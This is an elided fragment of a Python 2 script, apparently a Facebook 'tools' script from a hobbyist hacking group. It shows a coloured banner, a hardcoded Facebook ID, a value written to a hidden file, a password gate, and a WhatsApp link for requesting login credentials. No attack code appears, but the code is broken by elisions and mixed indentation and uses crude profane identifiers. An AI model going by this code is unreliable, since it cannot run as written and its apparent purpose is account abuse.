...
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░
        ...
        Developer : \x1b[1;93mMeer Sultan Baloch \x1b[1;97m[KHOSO]
  \n\x1b[1;96m        Our Group : \033[1;91mKhosa Mehfil \n\n''' 
os.system('clear')
lo_ngentod = '147276497562312'
...
def yayanxd():
    ...
    try:
        ...
        open('.pic/.sultan.txt', 'w').write(kontol)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
   	password = raw_input("\033[1;96m \x1b[1;97mTools Password  \x1b[1;96m====> ")
        ...
        os.system('xdg-open https://www.facebook.com/https://wa.me/923476508876?text=Meer%20Sultan%please%give%me%Login%20%password%20and%20%user')
### ORANG GANTENG ###
def moch_yayan():
